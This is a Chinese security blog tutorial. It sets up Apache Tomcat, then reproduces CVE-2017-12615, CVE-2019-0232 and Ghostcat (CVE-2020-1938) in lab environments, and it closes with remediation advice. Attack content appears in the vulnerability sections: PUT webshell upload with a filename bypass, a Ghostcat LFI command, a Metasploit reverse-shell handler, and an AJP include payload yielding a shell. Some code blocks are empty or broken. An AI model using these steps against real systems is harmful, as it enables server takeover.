## 0x00 前言 

> 最近挺常见tomcat漏洞的，打算总结一下。在复现一款软件或者产品的漏洞时，我倾向于源码安装一遍，而不是用docker无脑拉取搭建，这样能够快速熟悉内部目录结构、功能特征等，为接下来的漏洞复现与渗透测试做了很好的预热，理解也会更加深一些。如果只想要看漏洞总结可以直接跳到漏洞复现部分。

apache软件基金会开源项目、轻量级、性能稳定、调试jsp程序首选，常用于中小型企业且并发需求不是很多的网站。可以看作是apache的一个扩展，但是运行的时候和apache属于不同的进程，独立于apache。

## 0x01 Linux部署tomcat 

tomcat下载地址官网：https://tomcat.apache.org/

![](../Images/3af1c5b5696d9d6c5f7ae7a14f0023fb.png)![](../Images/b29fd35f9016601e5c51d03b88218d28.png)

#### 一、安装与启动tomcat

1、将下载的安装包放入kali的`/usr/src`目录下面并解包

![](../Images/a84060beadf45921c6f55ca6028ee557.png)

2、切换至 tomcat 目录下的 bin 目录，然后通过 `./startup.sh` 命令打开该脚本文件，启动`tomcat`成功

![](../Images/774b0ecd06b8cee7d1d64fcdad60d288.png)

#### 二、关闭tomcat

运行bin目录下的`shutdown.sh`即可

![](../Images/eb421f692823afbbf42e9f00d0c7f699.png)

#### 三、卸载tomcat

很简单，删除`/usr/src`下的tomcat目录即可。

#### 四、tomcat端口号更改

tomcat存在三个端口，**tomcat默认的端口是8080（访问端口），真正在项目上线之后，通常采用80。**

修改`/usr/src/tomcat/conf/server.xml`文件中的Connector端口号为期望端口后重启tomcat即可。

![](../Images/1ade7fef2ee70341d90dcbec5b8c90d6.png)

关于tomcat三个端口号的讲解可以参考此文章，这里不多赘述

https://blog.csdn.net/cheweigai9298/article/details/100849492

#### 五、后台用户名与密码配置(重要)

1、点击下方图片此位置或者直接在URL后面输入`/manager`

![](../Images/c949cca96823ba321f568b636d455cce.png)

2、在不知道用户名和密码的情况下，`Tomcat Manager`的用户名和密码可以到`Tomcat安装目录/conf/tomcat-users.xml`中进行查看。可以看到，默认情况下，`Tomcat Manager`的用户名和密码是注释掉的（在），即`Tomcat Manager`默认是禁用的。

![](../Images/6bd6ff5496bff9c960279b9c5ecb9580.png)

3、要使用`Tomcat Manager`，就要对用户进行配置（或取消注释符即可使用已配置的用户）。对用户的配置需要放在`<tomcat-users>`和`</tomcat-users>`之间。

![](../Images/8d8d466cd1c449dc900a44319f57bb11.png)

4、重启tomcat后，就可以看到tomcat进入后台成功，但是显示403禁止访问。但是通过看回显报错指示，`tomcat-users.xml`文件中配置出了问题。

![](../Images/3a47401acbe28157ecd60ea7d0446271.png)

5、将之前改的`manager`改为`manager-gui`即可。

![](../Images/6d5ca9dedb8e25045528e0abb451b25b.png)

6、登陆之后会看到一系列目录，就是tomcat目录中webapps中的文件目录，所有我们要在tomcat里运行的web项目都要存放在webapps中。

![](../Images/8f849e179caba0c65f40b234d643a6d4.png)

## 0x02 windows搭建 

#### 一、安装JDK和Tomcat

所需物料：

`jdk-8u311-windows-x64.exe`

`apache-tomcat-8.5.78-windows-x64.zip`

1、安装JDK：解压即可，尽量在C盘下，我的在`C:\Program Files\Java\jdk1.8.0_311`

备注：路径可以其他盘符，不建议路径包含中文名及特殊符号。

![](../Images/c77d7a49c28b3861a503aba634031383.png)

2、安装Tomcat：直接解压缩下载文件`“apache-tomcat-8.0.53-windows-x64.zip”`到C盘下。安装路径建议修改为：`C:\tomcat`。

![](../Images/96c6d02e580db334337b2eb498ae19ad.png)

#### 二、配置JDK环境变量（在步骤查看如何配置环境变量）

1、新建变量名：`JAVA_HOME`，变量值：`C:\Program Files\Java\jdk1.8.0_311`

![](../Images/4e5c2c69ec1855356b6bd9a6d2efac51.png)

2、打开path，添加变量值：`%JAVA_HOME%\bin`

![](../Images/fa6ebf5c4bfdb0d23b68a51f19f4cf2b.png)

备注：

1、`%JAVA_HOME%`就是引用前面指定的`JAVA_HOME`

2、`JAVA_HOME`指明JDK安装路径，此路径下包括lib，bin，jre等文件夹，tomcat，eclipse等的运行都需要依靠此变量。

3、`path`使得系统可以在任何路径下识别`java`命令。

#### 三、测试JDK

在CMD命令下输入javac，java，javadoc命令：出现图示界面，表示安装成功。

![](../Images/6cb410a317280062e3081e1af581a736.png)

#### 四、配置Tomcat环境变量

1，新建变量名：`CATALINA_HOME`，变量值：`C:\tomcat\apache-tomcat-8.5.78`

2，打开path，添加变值：`%CATALINA_HOME%\bin`

![](../Images/634040e2ab07b48f594357bf5ae5fc87.png)

#### 五、启动tomcat

`bin`目录下双击`start.bat`即可

![](../Images/e89e04161a365b52ef568f668967f27b.png)![](../Images/0e84be0a140b7d6f6cbb88dc318f86e7.png)

## 0x03 docker部署tomcat 

1、dockerhub上面查找tomcat镜像并拉取

![](../Images/a80d0d1a62f5584f5148fc598c5ecceb.png)

或者直接命令：

```
docker search tomcat --limit
 5
```

2、使用镜像创建tomcat实例运行镜像，之后访问网站

```

docker run -d -p 8080:8080 --name=t1 tomcat
```

发现是404，这是为什么呢？

![](../Images/23ff1af9f411ae042cbc9d636b135131.png)

3、是因为在`docker`拉取的`tomcat`最新版中有个小`bug`：存在`webapps.dist`和`webapps`这两个目录，而后者里面是空的，没有任何内容，需要将其删除之后，将`webapps.dist`改成`webapps`，即可成功启用`tomcat`内容。Docker 默认采用的是 NAT 网络模式，所以会自动创建`iptable`规则并自动开放端口，所以无需考虑防火墙问题

![](../Images/3e0c692a6fae28bd97af91611823f7d2.png)

4、访问tomcat首页

![](../Images/3d0660b9b52eeb8a782f7572ea913cab.png)

### 免修改版的安装

1、上面我们发现了，还要修改，是不是很麻烦？？而且我们平时根本就用不着这么高的`tomcat10`版本好吧，所以这里介绍一个免修改版的。

```


docker pull billygoo/tomcat8-jdk8
```

2、设置开机自启动

我们搭建好了之后，重新启动电脑，docker就不run了，tomcat就没了，怎么办？第一，确保docker是自启动的；第二输入下面这行命令，保证开机自启动。

```
systemctl enable

 docker
```

## 0x04 常见漏洞总结 

tomcat的漏洞一直是一个热点，正是因为tomcat搭建简单快速，使用的人慢慢多了起来。那么也就成为了漏洞了。以前有，将来也会有，这里只总结出近几年常见的、经典的高危漏洞。

### 一、后台弱口令爆破部署war包

`tomcat`是可以爆破的，在之前的搭建我们知道了tomcat的后台是`/manager`，一旦爆破成功进入后台，就可以在直接将`jsp`木马打包成`war`包，然后上传从而`getshell`。这里就不多赘述了，操作比较简单，一般也比较少见。

### 二、CVE-2017-12615任意文件写入(上传)

#### 01、漏洞概述

2017年9月19日，Apache Tomcat官方确认并修复了由于配置不当(非默认配置)而任意文件上传的高危漏洞：`CVE-2017-12615`

#### 02、漏洞原理

**一句话：在tomcat的配置文件web.xml中，没有限制PUT方法，从而可以任意写入文件。虽然限制了jsp文件的写入，但是可以多种方法绕过。**

漏洞环境用的是`vulhub-master`。进入到vulhub目录下`docker-compose up -d`，随后`docker exec -it id bash`进入容器查看配置文件`web.xml`

![](../Images/5d323a44d7b6f3ee32e4a013836d8f72.png)

可以看到`/usr/local/tomcat/conf/web.xml`里面的`readonly`字段是`false`，也就是说用户可以任意写入文件从而写入木马getshell。

![](../Images/3644e54056a36789540e786df1d0dd90.png)

#### 03、漏洞复现

1、`vulhub`搭建完毕后，访问页面，抓包修改请求方式为`PUT`，写入一个文件测试如下：

![](../Images/187921ce0eb7cf362a64ff3ef3da359a.png)

2、尝试写入`shell.jsp`，内容为冰蝎的`jsp`木马，发现响应码为404被拦截。

![](../Images/c3767d1b4639223bf7c3e5964f1ebcc3.png)

3、换一个木马名称并**使用`/`来绕过**，在`jsp`后缀后面使用，因为在文件名中是非法的，在`windows`和`linux`中都会自动去除。

![](../Images/f14cdd83afc91ce985b1bec73065458d.png)

4、可以看到`docker tomcat`网站根目录里面存在着`b.jsp`。

![](../Images/c5dee84954cfb00eabcea2006f8d7370.png)

5、随后冰蝎连接jsp木马即可。

![](../Images/d1de37a84e5ff85c6bad8864f55d9ed1.png)

### 三、CVE-2019-0232 Tomcat RCE

> 2019年4月13号，Apache Tomcat 9.0.18版本公告中提到，本次更新修复了一个代号为CVE-2019-0232的漏洞。
> 
> 该漏洞只对Windows平台有效，Apache Tomcat 9.0.0.M1到9.0.17,8.5.0到8.5.39和7.0.0到7.0.93中的CGI Servlet很容易受到远程执行代码的影响，攻击者向CGI Servlet发送一个精心设计的请求，可在具有Apache Tomcat权限的系统上注入和执行任意操作系统命令。漏洞成因是当将参数从JRE传递到Windows环境时，由于CGI\_Servlet中的输入验证错误而存在该漏洞。

#### 01、触发该漏洞需要同时满足以下条件：

**1、系统为Windows**

2、启用了CGI Servlet（默认为关闭）

3、 启用了enableCmdLineArguments（Tomcat 9.0.\*及官方未来发布版本默认为关闭）

所以别看漏洞是RCE，但是条件较为苛刻。

#### 02、漏洞范围

```


Apache Tomcat 9.0.0.M1 to 9.0.17
```

#### 03、漏洞复现

我这里用的就是上述windows搭建的tomcat版本

1、`Tomcat的 CGI_Servlet`组件默认是关闭的，在`tomcat/conf/web.xml`中找到注释的 CGIServlet部分，去掉注释，并配置`enableCmdLineArguments`和`executable`

![](../Images/269d91bbe168da8cb4dac224bf2dc3e7.png)

2、之后在`<load-on-startup>`标签上面一行添加下方代码：

```

</param-value>
```

3、之后在`WEB-ING/cgi`后添加一个`-bin`，最终代码如下：

![](../Images/1e9673e5bd4752eb752e9d47cf0f53f8.png)

4、然后在`conf/web.xml`中启用`cgi`的`servlet-mapping`，随后保存关闭。

![](../Images/94a70c773033f6e31cc6f7f1066b5699.png)

5、修改`conf/context.xml`的添加`privileged="true"`属性，否则会没有权限

![](../Images/40969150185cd795e1cdde59614513d6.png)

6、在`Tomcat\webapps\ROOT\WEB-INF`下创建`cgi-bin`目录,再在`cgi-bin`目录下创建一个`hello.bat`文件，内容如下图：

### 四、CVE-2020-1938 "幽灵猫"AJP文件包含漏洞(重点)

#### 01、漏洞概述

这是一个十分严重和经典的漏洞，`Tomcat`默认开启的`AJP`服务**(8009端口)**存在一处文件包含缺陷，攻击者通过`Tomcat AJP Connector`可以读取或包含`Tomcat`上所有`webapp`目录下的任意文件，例如可以读取`webapp`配置文件或源码。此外在目标应用有文件上传功能的情况下，**\==配合文件包含的利用还可以达到远程代码执行的危害==\*\*。

```


POC:
```

#### 02、影响版本

```


Apache Tomcat6
```

#### 03、漏洞复现

1、依旧是使用`vulhub`，进入`tomcat/CVE-2020-1938`后启动`apache tamcat`服务

![](../Images/1886f13221c45a869752e6dd54e0df79.png)

2、端口扫描发现8009 8080端口开启，证明有该漏洞。

![](../Images/bea33ac392204997e07945e5c1964d2e.png)

3、接着利用`POC`文件尝试查看`tomcat`的配置文件`web.xml`,注意执行环境为`python2`。回显的内容就是`web.xml`中的内容。

```
python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 目标ip –p 8009
 –f WEB-INF/web.xml
```

![](../Images/1c666dd748095882d624bb1bc9f4acd6.png)

#### 04、漏洞利用——RCE

如果此应用在网站服务中具备上传功能，攻击者也可以先向服务端上传一个含有JSP代码的恶意文件(上传文件可以是任意类型，图片、纯文本文件等)，然后利用Gh0stcat进行文件包含，从而达到代码执行的危害。

**这里提供一个利用思路：目标tomcat具有文件上传功能，同时存在sql注入，虽然sql注入没有权限直接getshell，但是能够查出上传图片名称，从而利用“幽灵猫”进行RCE攻击。**所以现在在外网打点很少见到sql注入getshell的情况，但是可以利用这个漏洞配合其他漏洞来造成危害。

1、假设环境中存在文件上传功能，并且我们通过`msfvenom`制作了一个`jsp`的图片马上传，我这里用`python`的`http`服务来模拟了。

![](../Images/7edd253b914821f4cda286611673782d.png)

2、启动msf监听

```
msfconsole -x "handler -H 0.0.0.0 -P 5555 -p java/jsp_shell_reverse_tcp"
 
```

![](../Images/adeafb62d99d1cd652e60c0b13003ae4.png)

3、下载`ajpfuzzer_v0.6.jar`

https://github.com/doyensec/ajpfuzzer/releases

![](../Images/d2bd0f3d769aeef455fe483999b5804f.png)

4、启动`ajpfuzzer_v0.6.jar`，连接目标机器的`8009`端口

![](../Images/a7e4f57401baa5568910ebe259036ec3.png)

5、构造`payload`，`shell.png`是相对于tomcat根目录`/webapps/ROOT/`的路径，如果环境中存在文件上传目录`upload`，可以改成`upload/xxx.png`，其中`xxx.png`的名字就是我们上传后的图片名字，网站肯定会重命名，所以可以配合其他漏洞例如sql注入来获取。

```
forwardrequest 2 "HTTP/1.1" "/11.jsp" 192.168.31.150 192.168.31.150 porto 8009 false "Cookie:AAAA=BBBB","Accept-Encoding:identity" "javax.servlet.include.request_uri:11.jsp","javax.servlet.include.path_info:shell.png","javax.servlet.include.servlet_path:/"

```

6、将上述`payload`运行在`AJPFuzzer`终端中，稍等片刻`msf`就获取到了`session`

![](../Images/e261eda480bf165f393e311f23b3d88b.png)

7、不过这个session是一个不太完整的session，可以使用`sessions -u `将其转换成`meterpreter`

![](../Images/59231a2e08f66c5cc9bf71870dbaea1e.png)

#### 05、修复建议

1、临时禁用AJP协议端口，在`conf/server.xml`配置文件中注释掉：`<Connector port=“8009” protocol="AJP/1.3"redirectPort=“8443” />`

2、配置ajp配置中的secretRequired跟secret属性来限制认证

3、下载更新版本。
